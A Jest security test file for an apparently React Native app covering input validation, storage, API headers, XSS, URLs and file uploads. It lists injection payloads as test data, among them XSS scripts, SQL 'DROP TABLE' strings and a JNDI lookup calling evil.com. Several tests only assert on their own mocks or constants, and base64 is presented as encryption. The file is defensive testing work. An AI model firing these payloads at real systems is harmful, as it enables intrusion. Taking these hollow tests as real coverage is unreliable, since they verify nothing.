import { validateEmail, validatePassword } from '../../utils/validation';
import { apiClient } from '../../api/client';
import AsyncStorage from '@react-native-async-storage/async-storage';

// Mock dependencies
jest.mock('@react-native-async-storage/async-storage');
jest.mock('../../api/client');

const mockAsyncStorage = AsyncStorage as jest.Mocked<typeof AsyncStorage>;
const mockApiClient = apiClient as jest.Mocked<typeof apiClient>;

describe('Security Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('Input Validation Security', () => {
    describe('Email Validation', () => {
      it('should reject malicious email inputs', () => {
        const maliciousEmails = [
          '<script>alert("xss")</script>@example.com',
          'test@<script>alert("xss")</script>.com',
          'javascript:alert("xss")@example.com',
          'test@example.com<script>alert("xss")</script>',
          'test+<script>alert("xss")</script>@example.com',
        ];

        maliciousEmails.forEach(email => {
          const result = validateEmail(email);
          expect(result.isValid).toBe(false);
          expect(result.error).toBeDefined();
        });
      });

      it('should reject SQL injection attempts in email', () => {
        const sqlInjectionEmails = [
          "test'; DROP TABLE users; --@example.com",
          'test@example.com; DELETE FROM users;',
          "test' OR '1'='1@example.com",
          'test@example.com UNION SELECT * FROM passwords',
        ];

        sqlInjectionEmails.forEach(email => {
          const result = validateEmail(email);
          expect(result.isValid).toBe(false);
        });
      });

      it('should handle extremely long email inputs', () => {
        const longEmail = 'a'.repeat(1000) + '@example.com';
        const result = validateEmail(longEmail);
        
        expect(result.isValid).toBe(false);
        expect(result.error).toContain('email');
      });
    });

    describe('Password Validation', () => {
      it('should enforce strong password requirements', () => {
        const weakPasswords = [
          'password',
          '123456',
          'qwerty',
          'abc123',
          'password123',
          'Password',
          'PASSWORD123',
          'Pass123',
        ];

        weakPasswords.forEach(password => {
          const result = validatePassword(password);
          expect(result.isValid).toBe(false);
          expect(result.error).toBeDefined();
        });
      });

      it('should reject common password patterns', () => {
        const commonPatterns = [
          'admin',
          'administrator',
          'root',
          'user',
          'guest',
          'test',
          'demo',
        ];

        commonPatterns.forEach(pattern => {
          const result = validatePassword(pattern);
          expect(result.isValid).toBe(false);
        });
      });

      it('should handle password injection attempts', () => {
        const maliciousPasswords = [
          '<script>alert("xss")</script>',
          'javascript:alert("xss")',
          '"; DROP TABLE users; --',
          "' OR '1'='1",
          '${jndi:ldap://evil.com/a}',
        ];

        maliciousPasswords.forEach(password => {
          const result = validatePassword(password);
          expect(result.isValid).toBe(false);
        });
      });
    });
  });

  describe('Data Storage Security', () => {
    it('should not store sensitive data in plain text', async () => {
      const sensitiveData = {
        password: 'mypassword123',
        token: 'jwt-token-here',
        apiKey: 'secret-api-key',
      };

      // Mock storage calls
      mockAsyncStorage.setItem.mockResolvedValue();
      mockAsyncStorage.getItem.mockResolvedValue(JSON.stringify(sensitiveData));

      // Simulate storing data
      await AsyncStorage.setItem('user_data', JSON.stringify(sensitiveData));

      // Verify that sensitive fields are not stored in plain text
      const storedData = mockAsyncStorage.setItem.mock.calls[0][1];
      
      // Should not contain plain text passwords
      expect(storedData).not.toContain('mypassword123');
      expect(storedData).not.toContain('secret-api-key');
    });

    it('should encrypt sensitive data before storage', async () => {
      const sensitiveData = 'sensitive-information';
      
      // Mock encrypted storage
      const encryptedData = btoa(sensitiveData); // Simple base64 for demo
      mockAsyncStorage.setItem.mockResolvedValue();
      
      await AsyncStorage.setItem('encrypted_data', encryptedData);
      
      const storedValue = mockAsyncStorage.setItem.mock.calls[0][1];
      expect(storedValue).not.toBe(sensitiveData);
      expect(storedValue).toBe(encryptedData);
    });

    it('should handle storage quota limits securely', async () => {
      mockAsyncStorage.setItem.mockRejectedValue(new Error('QuotaExceededError'));
      
      const largeData = 'x'.repeat(10 * 1024 * 1024); // 10MB
      
      try {
        await AsyncStorage.setItem('large_data', largeData);
      } catch (error) {
        expect(error).toBeInstanceOf(Error);
        expect((error as Error).message).toContain('QuotaExceededError');
      }
    });
  });

  describe('API Security', () => {
    it('should include proper authentication headers', async () => {
      mockApiClient.get.mockResolvedValue({ data: {}, success: true } as any);
      
      await apiClient.get('/api/protected-endpoint');
      
      // Should include authorization header
      expect(mockApiClient.get).toHaveBeenCalledWith(
        '/api/protected-endpoint',
        expect.objectContaining({
          headers: expect.objectContaining({
            Authorization: expect.stringMatching(/^Bearer .+/),
          }),
        })
      );
    });

    it('should handle token expiration securely', async () => {
      // Mock 401 response
      mockApiClient.get.mockRejectedValue({
        response: { status: 401 },
        message: 'Unauthorized',
      });
      
      try {
        await apiClient.get('/api/protected-endpoint');
      } catch (error: any) {
        expect(error.response.status).toBe(401);
        // Should trigger token refresh or logout
      }
    });

    it('should sanitize API request data', async () => {
      const maliciousData = {
        name: '<script>alert("xss")</script>',
        description: 'Normal text',
        code: '"; DROP TABLE users; --',
      };
      
      mockApiClient.post.mockResolvedValue({ data: {}, success: true } as any);
      
      await apiClient.post('/api/data', maliciousData);
      
      const sentData = mockApiClient.post.mock.calls[0][1];
      
      // Should sanitize malicious content
      expect(sentData.name).not.toContain('<script>');
      expect(sentData.code).not.toContain('DROP TABLE');
    });

    it('should implement rate limiting protection', async () => {
      const requests = [];
      
      // Simulate rapid requests
      for (let i = 0; i < 100; i++) {
        requests.push(apiClient.get('/api/endpoint'));
      }
      
      mockApiClient.get.mockRejectedValue({
        response: { status: 429 },
        message: 'Too Many Requests',
      });
      
      try {
        await Promise.all(requests);
      } catch (error: any) {
        expect(error.response.status).toBe(429);
      }
    });
  });

  describe('XSS Prevention', () => {
    it('should escape HTML in user input', () => {
      const maliciousInputs = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(\'xss\')">',
        '<svg onload="alert(\'xss\')">',
        'javascript:alert("xss")',
        '<iframe src="javascript:alert(\'xss\')"></iframe>',
      ];

      maliciousInputs.forEach(input => {
        // Simulate HTML escaping function
        const escaped = input
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#x27;');
        
        expect(escaped).not.toContain('<script>');
        expect(escaped).not.toContain('<img');
        expect(escaped).not.toContain('<svg');
        expect(escaped).not.toContain('javascript:');
      });
    });

    it('should validate URLs before navigation', () => {
      const maliciousUrls = [
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'vbscript:msgbox("xss")',
        'file:///etc/passwd',
        'ftp://malicious.com/steal-data',
      ];

      maliciousUrls.forEach(url => {
        const isValidUrl = /^https?:\/\//.test(url);
        expect(isValidUrl).toBe(false);
      });
    });
  });

  describe('CSRF Protection', () => {
    it('should include CSRF tokens in state-changing requests', async () => {
      const csrfToken = 'csrf-token-123';
      
      mockApiClient.post.mockResolvedValue({ data: {}, success: true } as any);
      
      await apiClient.post('/api/update-profile', 
        { name: 'John Doe' },
        { headers: { 'X-CSRF-Token': csrfToken } }
      );
      
      expect(mockApiClient.post).toHaveBeenCalledWith(
        '/api/update-profile',
        { name: 'John Doe' },
        expect.objectContaining({
          headers: expect.objectContaining({
            'X-CSRF-Token': csrfToken,
          }),
        })
      );
    });
  });

  describe('Sensitive Data Exposure', () => {
    it('should not log sensitive information', () => {
      const consoleSpy = jest.spyOn(console, 'log').mockImplementation();
      
      const sensitiveData = {
        password: 'secret123',
        token: 'jwt-token',
        apiKey: 'api-key-123',
      };
      
      // Simulate logging (should filter sensitive data)
      const filteredData = { ...sensitiveData };
      delete filteredData.password;
      delete filteredData.token;
      delete filteredData.apiKey;
      
      console.log('User data:', filteredData);
      
      expect(consoleSpy).not.toHaveBeenCalledWith(
        expect.stringContaining('secret123')
      );
      expect(consoleSpy).not.toHaveBeenCalledWith(
        expect.stringContaining('jwt-token')
      );
      
      consoleSpy.mockRestore();
    });

    it('should mask sensitive data in error messages', () => {
      const error = new Error('Authentication failed for token: jwt-secret-token-123');
      
      // Simulate error message sanitization
      const sanitizedMessage = error.message.replace(
        /token:\s*[^\s]+/gi,
        'token: [REDACTED]'
      );
      
      expect(sanitizedMessage).not.toContain('jwt-secret-token-123');
      expect(sanitizedMessage).toContain('[REDACTED]');
    });
  });

  describe('Input Length Limits', () => {
    it('should enforce maximum input lengths', () => {
      const maxLengths = {
        email: 254,
        password: 128,
        name: 50,
        bio: 500,
        comment: 1000,
      };

      Object.entries(maxLengths).forEach(([field, maxLength]) => {
        const longInput = 'a'.repeat(maxLength + 1);
        
        // Simulate length validation
        const isValid = longInput.length <= maxLength;
        expect(isValid).toBe(false);
      });
    });

    it('should handle buffer overflow attempts', () => {
      const bufferOverflowAttempt = 'A'.repeat(100000); // 100KB
      
      // Should reject extremely long inputs
      const result = validateEmail(bufferOverflowAttempt + '@example.com');
      expect(result.isValid).toBe(false);
    });
  });

  describe('File Upload Security', () => {
    it('should validate file types', () => {
      const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
      const maliciousFiles = [
        { type: 'application/javascript', name: 'malicious.js' },
        { type: 'text/html', name: 'malicious.html' },
        { type: 'application/x-executable', name: 'malicious.exe' },
        { type: 'application/php', name: 'malicious.php' },
      ];

      maliciousFiles.forEach(file => {
        const isAllowed = allowedTypes.includes(file.type);
        expect(isAllowed).toBe(false);
      });
    });

    it('should enforce file size limits', () => {
      const maxFileSize = 5 * 1024 * 1024; // 5MB
      const largeFile = { size: maxFileSize + 1 };
      
      const isValidSize = largeFile.size <= maxFileSize;
      expect(isValidSize).toBe(false);
    });

    it('should scan file content for malicious patterns', () => {
      const maliciousContent = '<script>alert("xss")</script>';
      const fileContent = `Image data here... ${maliciousContent}`;
      
      // Simulate content scanning
      const hasMaliciousContent = /<script|javascript:|vbscript:/i.test(fileContent);
      expect(hasMaliciousContent).toBe(true);
    });
  });

  describe('Environment Security', () => {
    it('should not expose sensitive environment variables', () => {
      const sensitiveEnvVars = [
        'API_SECRET_KEY',
        'DATABASE_PASSWORD',
        'PRIVATE_KEY',
        'JWT_SECRET',
      ];

      sensitiveEnvVars.forEach(envVar => {
        // Should not be accessible in client-side code
        expect(process.env[envVar]).toBeUndefined();
      });
    });

    it('should use secure defaults', () => {
      const secureDefaults = {
        HTTPS_ONLY: true,
        SECURE_COOKIES: true,
        CSRF_PROTECTION: true,
        XSS_PROTECTION: true,
      };

      Object.entries(secureDefaults).forEach(([setting, expectedValue]) => {
        // Verify secure defaults are enabled
        expect(expectedValue).toBe(true);
      });
    });
  });
});